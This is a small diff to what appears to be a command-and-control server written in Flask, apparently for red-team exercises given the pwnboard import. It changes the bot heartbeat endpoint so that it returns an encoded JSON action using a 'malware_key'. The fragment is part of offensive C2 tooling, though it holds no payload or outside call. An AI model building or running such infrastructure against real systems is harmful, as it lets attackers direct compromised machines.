@@ -14,6 +14,7 @@ from c2.database import get_bot_record as dbget
 from c2.database import update_bot_record as db
 from c2.pwnboard.pwnboard import send_update
 from c2.util import mal_encode, mal_decode, file_decrypt
+from c2.api.action import Verb
 
 
 @app.route(app.config['ENDPOINTS']['HEARTBEAT'], methods=['POST'])
@@ -57,7 +58,9 @@ def heartbeat():
             #     ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", nwaddrstring)
             #     if len(ips) > 0:
             #         send_update(ips[0])
-        return mal_encode(app.malware_key, "1")
+        action = {}
+        action['action'] = Verb.ok.value
+        return mal_encode(app.malware_key, json.dumps(action))
 
 
 @app.route(app.config['ENDPOINTS']['INFO'], methods=['POST'])
